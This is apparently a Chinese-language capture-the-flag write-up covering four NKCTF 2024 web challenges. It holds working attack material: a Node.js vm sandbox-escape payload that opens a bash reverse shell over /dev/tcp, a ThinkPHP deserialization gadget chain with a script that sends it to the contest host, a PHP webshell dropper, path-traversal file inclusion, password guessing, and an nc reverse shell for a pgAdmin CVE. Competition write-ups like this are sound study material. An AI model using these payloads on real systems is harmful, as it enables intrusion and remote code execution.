# NKCTF-2024-Web

  
  
&lt;!--more--&gt;  
## My first CMS  
通过搜索CVE得知  
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CMS%20Made%20Simple  
两个后台`RCE`分别是`CVE-2024-27623`和`CVE-2024-27622`  
通过忘记密码功能，得到用户名`admin`，接着爆破密码  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403231122473.png)
得到密码`Admin123`，登陆后台`RCE`即可  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403231127154.png)
## 全世界最简单的CTF  
```node  
const express = require(&#39;express&#39;);  
const bodyParser = require(&#39;body-parser&#39;);  
const app = express();  
const fs = require(&#34;fs&#34;);  
const path = require(&#39;path&#39;);  
const vm = require(&#34;vm&#34;);  
app.use(bodyParser.json()).set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;)).use(express.static(path.join(__dirname, &#39;/public&#39;)))   
app.get(&#39;/&#39;,  
function(req, res) {  
    res.sendFile(__dirname &#43; &#39;/public/home.html&#39;);  
})   
function waf(code) {  
    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\&#43;|concat|eval|Function)/g;  
    if (code.match(pattern)) {  
        throw new Error(&#34;what can I say? hacker out!!&#34;);  
    }  
}  
app.post(&#39;/&#39;,  
function(req, res) {  
    let code = req.body.code;  
    let sandbox = Object.create(null);  
    let context = vm.createContext(sandbox);  
    try {  
        waf(code)   
        let result = vm.runInContext(code, context);  
        console.log(result);  
    } catch(e) {  
        console.log(e.message);  
        require(&#39;./hack&#39;);  
    }  
})   
app.get(&#39;/secret&#39;,  
function(req, res) {  
    console.log(process.__filename);  
    if (process.__filename == null) {  
        let content = fs.readFileSync(__filename, &#34;utf-8&#34;);  
        return res.send(content);  
    } else {  
        let content = fs.readFileSync(process.__filename, &#34;utf-8&#34;);  
        return res.send(content);  
    }  
})   
app.listen(3000, () =&gt; {  
    console.log(&#34;listen on 3000&#34;);  
})  
```  
考察`vm`逃逸，以及RCE绕过  
参考文章  
https://mp.weixin.qq.com/s/G7RQJVYnwa1KdtnzyP32BA  
https://www.anquanke.com/post/id/237032  
构造出`payload`  
```node  
throw new Proxy({}, {  
        get: function(){  
            const cc = arguments.callee.caller;  
            const p = (cc.constructor.constructor(`${`${`return proces`}s`}`))();  
            const q = p.mainModule.require(`${`${`child_proces`}s`}`)  
            return Reflect.get(q, Reflect.ownKeys(q).find(x=&gt;x.includes(`cSync`)))(`bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;`).toString()  
        }  
    })  
```  
  
## 用过就是熟悉  
user/index/loginSubmit存在反序列化  
```php  
//你知道tp吗？  
if($data[&#39;name&#39;]===&#39;guest&#39;){  
	unserialize(base64_decode($data[&#39;password&#39;]));  
}  
```  
挖一条链子  
```php  
&lt;?php  
namespace think\process\pipes{  
    use think\Collection;  
    class Windows{  
        private $files = [];  
        public function __construct(){  
            $this-&gt;files=[new Collection];  
        }  
    }  
    echo base64_encode(serialize(new Windows));  
}  
namespace think{  
    class Collection{  
        protected $items;  
        public function __construct(){  
            $this-&gt;items = new View;  
        }  
  
    }  
    class View{  
        protected $data = [];  
        public $engine = [];  
        public function __construct(){  
            $this-&gt;data[&#34;Loginout&#34;]=new Debug; #写入tips  
            $this-&gt;engine[&#39;time&#39;]=&#34;10086&#34;;  
  
        }  
    }  
    class Debug{  
    }  
}  
?&gt;  
```  
由于文件名存在随机性，所以需要配合本地`docker`同时写入，  
```python  
import requests  
import time  
  
url1 = &#34;http://127.0.0.1:3101/?user/index/loginSubmit&#34;  
url2 = &#34;http://89519612-bb1c-465b-921b-d01e8a3ce7e4.node.nkctf.yuzhian.com.cn/?user/index/loginSubmit&#34;  
burp0_headers = {&#34;sec-ch-ua&#34;: &#34;\&#34;Chromium\&#34;;v=\&#34;117\&#34;, \&#34;Not;A=Brand\&#34;;v=\&#34;8\&#34;&#34;, &#34;Accept&#34;: &#34;application/json, text/javascript, */*; q=0.01&#34;, &#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded; charset=UTF-8&#34;, &#34;X-Requested-With&#34;: &#34;XMLHttpRequest&#34;, &#34;sec-ch-ua-mobile&#34;: &#34;?0&#34;, &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36&#34;, &#34;sec-ch-ua-platform&#34;: &#34;\&#34;macOS\&#34;&#34;, &#34;Origin&#34;: &#34;http://localhost:3101&#34;, &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;, &#34;Sec-Fetch-Mode&#34;: &#34;cors&#34;, &#34;Sec-Fetch-Dest&#34;: &#34;empty&#34;, &#34;Referer&#34;: &#34;http://localhost:3101/&#34;, &#34;Accept-Encoding&#34;: &#34;gzip, deflate, br&#34;, &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;, &#34;Connection&#34;: &#34;close&#34;}  
burp0_data = {&#34;name&#34;: &#34;guest&#34;, &#34;password&#34;: &#34;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2OiJ0aGlua1xDb2xsZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3IjoyOntzOjc6IgAqAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMToidGhpbmtcRGVidWciOjA6e319czo2OiJlbmdpbmUiO2E6MTp7czo0OiJ0aW1lIjtzOjU6IjEwMDg2Ijt9fX19fQ==&#34;}  
r=requests.post(url1, headers=burp0_headers, data=burp0_data)  
r=requests.post(url2, headers=burp0_headers, data=burp0_data)  
print(r.status_code)  
r=requests.post(url1, headers=burp0_headers, data=burp0_data)  
```  
得到文件名  
`7c5d4e0dc66c95954008f97b3f0cf6fa`  
`https://89519612-bb1c-465b-921b-d01e8a3ce7e4.node.nkctf.yuzhian.com.cn/app/controller/user/think/7c5d4e0dc66c95954008f97b3f0cf6f`  
访问即可得到hint  
```php  
亲爱的Chu0，  
  
我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。  
  
在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。  
  
或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。  
  
  
  
&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  
  
  
  
而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。  
  
你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。  
  
或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。  
  
  
  
POST /?user/index/loginSubmit HTTP/1.1  
Host: 192.168.128.2  
Content-Length: 162  
Accept: application/json, text/javascript, */*; q=0.01  
X-Requested-With: XMLHttpRequest  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
Origin: http://192.168.128.2  
Referer: http://192.168.128.2/  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9  
Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx  
Connection: close  
  
name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmit  
  
hint: 新建文件  
```  
`guest/!@!@!@!@NKCTFChu0`  
在`我的文档`处上传文件，利用链子去包含即可  
```txt  
&lt;?php system(&#34;echo &#39;&lt;?php eval(\$_POST[1]);?&gt;&#39; &gt; /var/www/html/app/1.php&#34;);?&gt;  
```  
```php  
&lt;?php  
namespace think\process\pipes{  
    use think\Collection;  
    class Windows{  
        private $files = [];  
        public function __construct(){  
            $this-&gt;files=[new Collection];  
        }  
    }  
    echo base64_encode(serialize(new Windows));  
}  
namespace think{  
    class Collection{  
        protected $items;  
        public function __construct(){  
            $this-&gt;items = new View;  
        }  
  
    }  
    class View{  
        protected $data = [];  
        public $engine = [];  
        public function __construct(){  
            $this-&gt;data[&#34;Loginout&#34;]=new Config;  
            $this-&gt;engine[&#39;name&#39;]=&#34;../../../../../../../../../../../../../../../../var/www/html/data/files/202403/23_fb210ebc/huahua.txt&#34;;  
            // $this-&gt;data[&#34;Loginout&#34;]=new Debug; #写入tips  
            // $this-&gt;engine[&#39;time&#39;]=&#34;10086&#34;;  
  
        }  
    }  
    class Config{  
    }  
    # 写入tips  
    // class Debug{  
  
    // }  
}  
?&gt;  
```  
得到`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403232129654.png)
  
## attack_tacooooo  
tacooooo@qq.com:tacooooo  
登陆之后，考察`CVE-2024-2044`  
根据此篇文章复现  
https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/  
`nc`反弹shell，后找一个linux信息收集脚本找`flag`  
利用`wget`上传  
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403231954728.png)

---

> Author: N1Rvana  
> URL: http://localhost:1313/nkctf-2024-web/  

